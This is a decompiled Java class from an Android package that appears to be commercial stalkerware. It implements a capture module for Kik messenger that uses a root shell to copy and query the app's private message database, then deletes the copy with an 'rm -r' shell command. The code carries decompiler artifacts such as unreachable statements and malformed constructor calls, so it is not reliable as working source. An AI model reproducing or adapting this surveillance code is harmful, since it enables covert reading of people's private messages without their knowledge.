package com.vvt.capture.kik.b;

import android.os.SystemClock;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  private String d;
  private com.vvt.base.b e;
  private long f = -1;
  
  public b(String paramString, com.vvt.base.b paramb)
  {
    this.d = paramString;
    this.e = paramb;
  }
  
  private void b()
  {
    String str1 = c.a(this.d);
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    long l2 = 3000L;
    for (;;)
    {
      try
      {
        SystemClock.sleep(l2);
        String str1 = c.a();
        if (str1 == null) {
          break label257;
        }
        String str2 = this.d;
        str2 = c.a(str2);
        String str3 = this.d;
        Object localObject2 = this.e;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        String str4 = c.a(str1, str2, str3, (String)localObject2);
        bool1 = com.vvt.ag.b.a(str4);
        if (bool1) {
          break label257;
        }
        long l3 = com.vvt.capture.kik.b.b(str4);
        bool1 = false;
        str1 = null;
        l2 = l3;
        int j = 0;
        str3 = null;
        boolean bool3 = l2 < l1;
        if (bool3) {
          break label260;
        }
        int k = 10;
        if (j >= k) {
          break label260;
        }
        l2 = 6000L;
        SystemClock.sleep(l2);
        long l4 = com.vvt.capture.kik.b.b(str4);
        int i = j + 1;
        j = i;
        l2 = l4;
        continue;
        boolean bool2;
        boolean bool4;
        FxSimpleEventReference localFxSimpleEventReference;
        Long localLong;
        this.f = l2;
      }
      catch (Exception localException)
      {
        bool2 = c;
        if (bool2) {}
        b();
        l2 = l1;
        bool4 = l2 < l1;
        if (!bool4)
        {
          bool2 = b;
          if (bool2) {}
          l2 = this.f;
          localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
          localFxSimpleEventReference.<init>();
          localLong = Long.valueOf(l2);
          localFxSimpleEventReference.setReference(localLong);
          bool2 = a;
          if (bool2) {}
          return localFxSimpleEventReference;
        }
      }
      finally
      {
        b();
      }
      continue;
      label257:
      l2 = l1;
      label260:
      b();
    }
  }
  
  public List a(int paramInt)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = c.a();
      String str1 = this.d;
      String str2 = com.vvt.n.a.c.a.a();
      Object localObject2 = this.e;
      localObject2 = ((com.vvt.base.b)localObject2).f();
      str2 = c.a(str1, str2, (String)localObject2);
      if (localObject1 != null)
      {
        str1 = this.d;
        str1 = c.a(str1);
        localObject2 = this.d;
        Object localObject3 = this.e;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        str1 = c.a((String)localObject1, str1, (String)localObject2, (String)localObject3);
        long l1 = com.vvt.capture.kik.b.a(paramInt, str1);
        long l2 = 1L;
        l1 -= l2;
        l2 = com.vvt.capture.kik.b.b(str1);
        bool = com.vvt.ag.b.a(str1);
        if (!bool)
        {
          localObject1 = this.d;
          com.vvt.base.b localb = this.e;
          localObject1 = com.vvt.capture.kik.b.a((String)localObject1, str1, str2, l1, l2, localb);
          localArrayList.addAll((Collection)localObject1);
        }
        b();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = paramg1.getReference();
      localObject1 = (Long)localObject1;
      long l1 = ((Long)localObject1).longValue();
      localObject1 = paramg2.getReference();
      localObject1 = (Long)localObject1;
      long l2 = ((Long)localObject1).longValue();
      localObject1 = this.d;
      String str = com.vvt.n.a.c.a.a();
      Object localObject2 = this.e;
      localObject2 = ((com.vvt.base.b)localObject2).f();
      localObject2 = c.a((String)localObject1, str, (String)localObject2);
      localObject1 = c.a();
      if (localObject1 != null)
      {
        str = this.d;
        str = c.a(str);
        Object localObject3 = this.d;
        Object localObject4 = this.e;
        localObject4 = ((com.vvt.base.b)localObject4).f();
        str = c.a((String)localObject1, str, (String)localObject3, (String)localObject4);
        bool = com.vvt.ag.b.a(str);
        if (!bool)
        {
          localObject1 = this.d;
          localObject3 = this.e;
          localObject1 = com.vvt.capture.kik.b.a((String)localObject1, str, (String)localObject2, l1, l2, (com.vvt.base.b)localObject3);
          localArrayList.addAll((Collection)localObject1);
        }
        b();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/kik/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */